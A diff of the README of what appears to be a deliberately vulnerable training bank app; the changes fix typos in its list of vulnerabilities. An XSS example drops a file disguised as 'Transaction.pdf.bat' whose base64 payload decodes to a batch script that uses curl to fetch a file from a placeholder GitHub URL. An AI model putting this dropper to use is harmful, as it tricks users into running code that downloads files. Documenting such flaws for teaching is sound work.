@@ -150,7 +150,7 @@ VALUES
     - This link has R-XSS [https://shorturl.at/ckvAF] which is infected with: 
         ```HTML
         <script>
-            fileName = "Tranaction.pdf.bat";
+            fileName = "Transaction.pdf.bat";
             fileData = "QGVjaG8gb2ZmDQoNCjo6IERlZmluZSB0aGUgVVJMIG9mIHRoZSByYXcgZmlsZSBvbiBHaXRIdWINCnNldCBmaWxlVXJsPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS91c2VybmFtZS9yZXBvL21haW4vcGF0aC90by9maWxlLnR4dA0KDQo6OiBEZWZpbmUgdGhlIHRhcmdldCBkaXJlY3Rvcnkgd2hlcmUgeW91IHdhbnQgdG8gc2F2ZSB0aGUgZmlsZQ0Kc2V0IHRhcmdldERpcj1DOi8vDQoNCjo6IENyZWF0ZSB0aGUgdGFyZ2V0IGRpcmVjdG9yeSBpZiBpdCBkb2Vzbid0IGV4aXN0DQppZiBub3QgZXhpc3QgIiV0YXJnZXREaXIlIiBta2RpciAiJXRhcmdldERpciUiDQoNCjo6IFVzZSBjdXJsIHRvIGRvd25sb2FkIHRoZSBmaWxlDQpjdXJsIC1vICIldGFyZ2V0RGlyJVxmaWxlLnR4dCIgIiVmaWxlVXJsJSINCg==";
 
             function base64tobytes(base64Adata){
@@ -187,7 +187,7 @@ VALUES
 4. File Injection
     - File Injection is a security vulnerability where an attacker can manipulate or inject malicious files, typically to exploit a system's processing and execute unauthorized code or access sensitive data, potentially compromising system integrity and security.
     - CVE code: ```CVE-2020-25048```
-    - In ITB, [Support Page]'s Attachments feild is vulnerable to file injection.
+    - In ITB, [Support Page]'s Attachments field is vulnerable to file injection.
     - Sample Code to demonstrate it:
         ```HTML
         ./try.php
@@ -206,7 +206,7 @@ VALUES
 5. Insecure API
     - Insecure API refers to an application programming interface that lacks proper security measures, making it susceptible to various threats such as data breaches, unauthorized access, and manipulation, highlighting the need for robust security practices to protect sensitive data and ensure the integrity of communication.
     - CVE code: ```CVE-2023-40729```
-    - In ITB, all data in [Dashboard Page] is coming thorugh insecure API.
+    - In ITB, all data in [Dashboard Page] is coming through insecure API.
     - [Vulnerable Code](https://github.com/Hritikpatel/InsecureTrust_Bank/blob/0e5444c85ec418258562639c3383b31077374692/assets/php_process/api.php#L37), Here we are forwarding SQL response to client with out encrypting...
 
 ## Vulnerability mentioned above are resolved in [STB]
